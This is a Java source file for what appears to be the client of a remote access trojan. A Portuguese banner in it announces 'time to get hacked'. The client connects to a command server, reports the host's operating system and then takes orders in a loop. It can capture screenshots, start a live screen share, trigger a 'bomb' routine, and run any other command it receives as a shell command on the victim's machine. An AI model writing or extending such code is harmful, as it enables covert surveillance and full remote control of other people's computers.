package main;

import main.network.Connection;
import main.network.Message;
import main.utils.OsCheck;

import java.awt.AWTException;
import java.io.IOException;
import java.net.Socket;

import static main.utils.Bomb.explode;
import static main.utils.ClientUtils.runTerminalCommand;
import static main.utils.ClientUtils.sendCommandList;
import static main.utils.ScreenUtils.sendScreenshot;
import static main.utils.ScreenUtils.startScreenShare;
import static main.utils.ScreenUtils.stopScreenShare;

public class Client {
    static Connection connection;
    static OsCheck.OSType MY_OS;

    public static void main(String[] args) {
        try {
            System.out.println("Opa ta na hora de ser haskiado");
            connection = new Connection(new Socket("localhost", 27015));

            MY_OS = OsCheck.getOperatingSystemType();

            Message osMessage = new Message("print", "User is using " + MY_OS.name());
            connection.sendMessage(osMessage);

            while (true) {
                handleServerCommand();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void handleServerCommand() throws AWTException, IOException {
        String command = connection.readMessage().getCommand();

        switch (command) {
            case "screen":
                sendScreenshot(connection, false);
                break;
            case "start-screenshare":
                startScreenShare(connection);
                break;
            case "stop-screenshare":
                stopScreenShare();
                break;
            case "bomb":
                explode(connection);
                break;
            case "help":
                sendCommandList(connection);
                break;
            default:
                runTerminalCommand(MY_OS, command, connection);
        }
    }
}
